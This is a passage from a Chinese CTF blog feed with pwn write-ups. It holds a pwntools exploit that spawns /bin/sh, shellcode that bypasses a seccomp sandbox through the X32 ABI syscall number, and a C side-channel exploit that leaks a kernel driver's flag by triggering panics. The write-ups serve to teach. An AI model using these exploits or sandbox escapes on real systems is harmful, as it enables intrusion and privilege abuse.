class="number">0xdeadbeef</span>)+p64(<span class="number">0</span>)[:<span class="number">-1</span>])</span><br><span class="line">login(<span class="string">'/bin/sh'</span>,<span class="string">'\n'</span>)</span><br><span class="line">change_password(p64(libc.symbols[<span class="string">'system'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      没有参加网鼎杯的比赛，在家放假咸鱼了两周，回来复现了几道题，本篇记录blind、EasyCoin两题。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2018 Final赛记</title>
    <link href="http://p4nda.top/2018/07/27/CISCN-Final/"/>
    <id>http://p4nda.top/2018/07/27/CISCN-Final/</id>
    <published>2018-07-27T05:26:01.000Z</published>
    <updated>2018-07-28T03:52:43.409Z</updated>
    
    <content type="html"><![CDATA[<p>总而言之，我就觉得这次主办方的想法很有问题。尤其是最后在所有选手在场等了一个下午的情况下，没有给参赛队颁奖的环节，反而给什么优秀支撑单位、技术委员会颁了奖。这也是我第一次见过这样的设计，比赛在北京打，颁奖隔两天去武汉颁，谁有精力陪你折腾，而且没有任何通知，真的是mdzz。</p><p><strong><em>//以上戾气有点大，这次比赛还是学了很多东西的，内容有点短，就当我水了一篇吧，实在是有的东西不想说了。</em></strong></p><p>我们队分了一道CNSS战队plusls师傅出的一道PWN题，其中有一个seccomp沙箱，里面的逻辑是这样的。</p><p><img src="/img/ciscn-final/1-1.png" alt=""></p><p>看起来，没有什么问题，主要限制了open系列的系统调用，限制了这个以后，shell也没法起了。</p><p>比赛时，没有想到如何过这个限制。第一天打完了以后和plusls师傅交流了一下，感觉是个挺有意思的东西。</p><p>首先，线上赛那个题目逻辑挺复杂的，利用<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>简单复现了一下逻辑。</p><p>sandbox.asm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A = arch</span><br><span class="line">A == ARCH_X86_64 ? next : dead</span><br><span class="line">A = sys_number</span><br><span class="line">A == open ? dead : next</span><br><span class="line">A == mmap ? dead : next</span><br><span class="line">A == ptrace ? dead : next</span><br><span class="line">A == openat ? dead : next</span><br><span class="line">A == open_by_handle_at ? dead : next</span><br><span class="line">return ALLOW</span><br><span class="line">dead:</span><br><span class="line">return KILL</span><br></pre></td></tr></table></figure><p>将沙箱逻辑使用seccomp-tools编译，将其转换为数组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/<span class="built_in">test</span>/x32 abi] - [五 7月 27, 16:00]</span><br><span class="line">└─[$] &lt;&gt; seccomp-tools asm sandbox.asm -a amd64  -f carray</span><br><span class="line">unsigned char bpf[] = &#123;32,0,0,0,4,0,0,0,21,0,0,7,62,0,0,192,32,0,0,0,0,0,0,0,21,0,5,0,2,0,0,0,21,0,4,0,9,0,0,0,21,0,3,0,101,0,0,0,21,0,2,0,1,1,0,0,21,0,1,0,48,1,0,0,6,0,0,0,0,0,255,127,6,0,0,0,0,0,0,0&#125;;</span><br><span class="line"></span><br><span class="line">┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/<span class="built_in">test</span>/x32 abi] - [五 7月 27, 16:00]</span><br><span class="line">└─[$] &lt;&gt; seccomp-tools asm sandbox.asm -a amd64 -f raw | seccomp-tools disasm -</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x05 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000009  <span class="keyword">if</span> (A == mmap) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000065  <span class="keyword">if</span> (A == ptrace) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000101  <span class="keyword">if</span> (A == openat) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000130  <span class="keyword">if</span> (A == open_by_handle_at) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>然后就可以编写程序逻辑了，这里我使用一个简化的demo，直接开沙箱执行shellcode：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> bpf[] = &#123;<span class="number">32</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">192</span>,<span class="number">32</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">101</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>,<span class="number">127</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> = &#123;</span><span class="number">10</span>,bpf&#125;; <span class="comment">//10代表沙箱规则条数</span></span><br><span class="line">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> * shellcode;</span><br><span class="line"><span class="keyword">void</span> (*vul)();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"sandbox init"</span>);</span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>,<span class="string">"shellcode:"</span>,<span class="number">0x10</span>);</span><br><span class="line">shellcode = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_EXEC | PROT_READ |PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">read(<span class="number">0</span>,shellcode,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"call %p"</span>,shellcode);</span><br><span class="line">vul = shellcode;</span><br><span class="line">sandbox();</span><br><span class="line">vul();</span><br><span class="line"><span class="comment">//shellcode();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，可以发现程序无法打开文件。</p><p>利用赛后交流时提到的X32 ABI，我后来搜索了一下，比较早出现这个东西的是BCTF的一道PWN题，和这个类似。看了一下发现这个东西方法是一个系统调用的两个调用号，官方的说法是0x40000000置了一个标准位。</p><p>然后，利用这一点，在调用open时，使用0x40000002，这个调用号就可以绕过沙箱，读出flag了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./vul"</span>)</span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode+= shellcraft.write(<span class="number">1</span>,<span class="string">"input:"</span>,<span class="number">0x6</span>)</span><br><span class="line">shellcode+= shellcraft.read(<span class="number">0</span>,<span class="number">0x601200</span>,<span class="number">0x20</span>)</span><br><span class="line">shellcode+= <span class="string">'''    mov edi, 0x1010101 /* 6296064 == 0x601200 */</span></span><br><span class="line"><span class="string">    xor edi, 0x1611301</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    /* call open() */</span></span><br><span class="line"><span class="string">    push 0x40000002 /* 2 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall\n</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode+= shellcraft.read(<span class="number">3</span>,<span class="number">0x601200</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode+= shellcraft.write(<span class="number">1</span>,<span class="number">0x601200</span>,<span class="number">0x100</span>)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.recvuntil(<span class="string">'input:'</span>)</span><br><span class="line">p.send(<span class="string">'./flag\0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/ciscn-final/1-2.png" alt=""></p><p>参考：</p><p><a href="https://sites.google.com/site/x32abi/" target="_blank" rel="noopener">https://sites.google.com/site/x32abi/</a></p><p><a href="https://blog.csdn.net/qq_29343201/article/details/72627528" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/72627528</a></p><p><a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">https://github.com/david942j/seccomp-tools</a></p><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p>最后附上PPT</p><p><img src="/img/ciscn-final/ppt1.jpg" alt=""></p><p><img src="/img/ciscn-final/ppt2.jpg" alt=""></p><p><img src="/img/ciscn-final/ppt3.jpg" alt=""></p><p><img src="/img/ciscn-final/ppt4.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      一些参加全国大学生信息安全竞赛决赛的记录，本来想多吐槽一些的，后来想想算了，别留那么多负能量，不过最后这个颁奖环节我真的忍不了了... 
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>【KERNEL PWN】0ctf 2018 final baby题解</title>
    <link href="http://p4nda.top/2018/07/20/0ctf-baby/"/>
    <id>http://p4nda.top/2018/07/20/0ctf-baby/</id>
    <published>2018-07-20T10:39:12.000Z</published>
    <updated>2018-11-13T11:22:35.681Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1s_lqbRZdPsAcp2qm52A-kw" target="_blank" rel="noopener">题目及相关下载</a> 密码:<strong><em>fant</em></strong></p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>题目代码很简单，仅注册了ioctl函数，里面包含了两个case，在参数为0x6666时，可以泄露出bss段flag的地址。</p><p>在参数为0x1337时，用户输入是一个结构体，而传入驱动的是一个指针。</p><p>这个结构体应该是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">input</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> *flag;</span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对这个结构体指针进行一系列判断以后，会比较结构体中的flag指针指向的内容和长度，当比较的用户输入长度和内容都是flag时，使用printk打印flag内容。</p><p><img src="/img/0ctf-babyko/1-1.png" alt=""></p><p>仔细查看一下_chk_range_not_ok，看类C代码看不出什么意思，查看一下汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000000 __chk_range_not_ok proc near            ; CODE XREF: baby_ioctl+7B↓p</span><br><span class="line">.text:0000000000000000                                         ; baby_ioctl+BD↓p</span><br><span class="line">.text:0000000000000000                 push    rbp</span><br><span class="line">.text:0000000000000001                 add     rdi, rsi</span><br><span class="line">.text:0000000000000004                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000007                 jb      short loc_11</span><br><span class="line">.text:0000000000000009                 cmp     rdx, rdi</span><br><span class="line">.text:000000000000000C                 setb    al</span><br><span class="line">.text:000000000000000F                 pop     rbp</span><br><span class="line">.text:0000000000000010                 retn</span><br><span class="line">.text:0000000000000011 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000011</span><br><span class="line">.text:0000000000000011 loc_11:                                 ; CODE XREF: __chk_range_not_ok+7↑j</span><br><span class="line">.text:0000000000000011                 mov     eax, 1</span><br><span class="line">.text:0000000000000016                 pop     rbp</span><br><span class="line">.text:0000000000000017                 retn</span><br><span class="line">.text:0000000000000017 __chk_range_not_ok endp</span><br></pre></td></tr></table></figure><p>可以看出，是将第一个参数和第二个参数相加，判断是否小于第三个参数，如果不小于将al置为1。</p><p>在动态调试的时候，发现第三个参数是一个常量： 0x7ffffffff000</p><p>这样的话，题目就很清楚了。判断的限制是传入的结构体+16，也就是整个结构体要在用户态中，并且结构体中第一个成员所指向的内存也要在用户态中。并且第二个参数要和bss段上的flag长度相等。这样会逐字节比较输入的flag是否等于bss保存的flag。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>和libc的pwn题不太一样，内核驱动的pwn需要驱动在一个版本的内核代码下编译，否则无法运行。</p><p><img src="/img/0ctf-babyko/2-1.png" alt=""></p><p>在程序代码中可以看到一个内核版本号——4.15.0-22-generic SMP mod_unload，我从官网源代码下载的版本只有4.15.0而没有-22的小版本。</p><p>此时，可以通过下载相应的内核deb包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt download linux-image-4.15.0-22-generic</span><br></pre></td></tr></table></figure><p>下载得到的linux-image-4.15.0-22-generic_4.15.0-22.24~16.04.1_amd64.deb中data.tar.xz下的boot中可以找到一个叫vmlinuz-4.15.0-22-generic的文件，这就是需要的内核映像。</p><p>此处需要明确文件的区别        <strong><em>//一定是我太菜才不知道</em></strong></p><p>vmlinux：这个是编译出来原始的内核，未经过压缩，<strong>不能直接通过qemu启动</strong>，是一个ELF文件，里面包括了符号表等等一系列内核相关的指令，可以用IDA Pro查看，可以找gadget等等等等。类比于libc pwn中的libc-2.23.so之类的，给了这个东西就可以找gadget、找地址偏移等等。</p><p>bzImage：这个是vmlinux压缩以后，并且加上一段解压启动代码得到。这个东西可以放到QEMU中跑，但是不能用IDA打开。</p><p>*.cpio：这个东西一般都是打包生成的，最开始是从busybox中导出来的，类似于启动的文件系统吧（？）一般kernel pwn会在这里放*.ko。甚至放vmlinux…</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>环境搭建起来了，就可以看一下漏洞如何利用了。比赛中出现了两种解题方法，一种是预期解，另外一种是侧信道攻击。</p><h2 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h2><p>所谓侧信道攻击就是用能标明flag内容的方法，通过其他表现形式把flag爆破出来。</p><p>在程序中存在一个问题，就是在比较之前没有判断用户输入的flag段是否可读的，当输入的flag处于不可读段的时候，在比较时会触发段错误，从而造成kernel panic，利用这种现象可以用一下方法每次爆破一个字节的flag。</p><p>方法原理如下，利用mmap新建3个段，第一个、第三个权限设为000，第二可读写，并且每次将已有的flag防止在第二个段的最后，每次最后一个字节时爆破的字节，当这个字节和flag不符合时，内核驱动会退出，因此不触发错误。而当最后一个字节正确时，程序比较会下移一个字节，触发错误，引起kernel panic，从而可以判断出单字节的flag，原理如下：</p><p><img src="/img/0ctf-babyko/2-3.png" alt=""></p><p>这样测试33次就可以得到flag了。</p><p><img src="/img/0ctf-babyko/2-2.png" alt=""></p><p>EXP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// start.c </span></span><br><span class="line"><span class="comment">// for start pwn.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *ch = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%%&amp;\\'()*+,-./:;&lt;=&gt;?@[]^_`&#123;|&#125;~"</span>;</span><br><span class="line"><span class="keyword">char</span> input[<span class="number">34</span>]= &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> order[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">char</span> order2[<span class="number">0x100</span>];</span><br><span class="line">FILE * fd = fopen(<span class="string">"save.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line"><span class="built_in">fscanf</span>(fd,<span class="string">"%s"</span>,input);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i&lt;<span class="built_in">strlen</span>(ch);i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (ch[i] == <span class="string">'\"'</span> ||  ch[i] == <span class="string">'\\'</span> || ch[i] == <span class="string">'`'</span> )&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(order,<span class="string">"echo \"%s\\%c\" &gt; save.txt"</span>,input,ch[i]);</span><br><span class="line"><span class="built_in">sprintf</span>(order2,<span class="string">"./pwn %s\\%c"</span>,input,ch[i] );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(order,<span class="string">"echo \"%s%c\" &gt; save.txt"</span>,input,ch[i]);</span><br><span class="line"><span class="built_in">sprintf</span>(order2,<span class="string">"./pwn %s%c"</span>,input,ch[i] );</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,order2);</span><br><span class="line">system(order);</span><br><span class="line">system(order2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//strcpy(order,"echo \"");</span></span><br><span class="line"><span class="comment">//strcpy</span></span><br><span class="line"><span class="comment">//system("")</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------------------*/</span></span><br><span class="line"><span class="comment">// pwn.c</span></span><br><span class="line"><span class="comment">// test per round</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">input</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> *flag;</span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i , fd;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">input</span> <span class="title">input</span> ;</span>  </span><br><span class="line"><span class="keyword">if</span> (argc!=<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"argc error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; input : %s len: %d \n"</span>,argv[<span class="number">1</span>],<span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</span><br><span class="line">mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">buf = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_NONE,MAP_SHARED|MAP_ANONYMOUS,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(buf&gt;<span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; get a memeroy: %p\n"</span>,buf);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span> ; i&lt;<span class="built_in">strlen</span>(argv[<span class="number">1</span>]);i++)&#123;</span><br><span class="line">buf[<span class="number">0x1000</span> - <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + i] = argv[<span class="number">1</span>][i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; addr: %p content: %c \n"</span>, &amp;buf[<span class="number">0x1000</span> - <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + i], argv[<span class="number">1</span>][i] );</span><br><span class="line">&#125;</span><br><span class="line">fd = open(<span class="string">"/dev/baby"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"cannot open /dev/baby\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; fd of /dev/baby: %d\n"</span>,fd);</span><br><span class="line">((struct _input * )buf)-&gt;len = <span class="number">33</span>;</span><br><span class="line">((struct _input * )buf)-&gt;flag = (buf+<span class="number">0x1000</span>-<span class="built_in">strlen</span>(argv[<span class="number">1</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&lt;= DBG =&gt; input: %p\n"</span>,input.flag);</span><br><span class="line">ioctl(fd,<span class="number">0x1337</span>,buf);</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>预期解的漏洞叫做double fetch漏洞，应该算是一种竞争条件漏洞</p><p><strong>Serna[ Serna, F. J. MS08-61:thecaseofthekernelmodedoublefetch,2008.<a href="https://blogs.technet.microsoft.com/srd/2008/10/14/ms08-061-the-case-of-the-kernel-mode-double-fetch/" target="_blank" 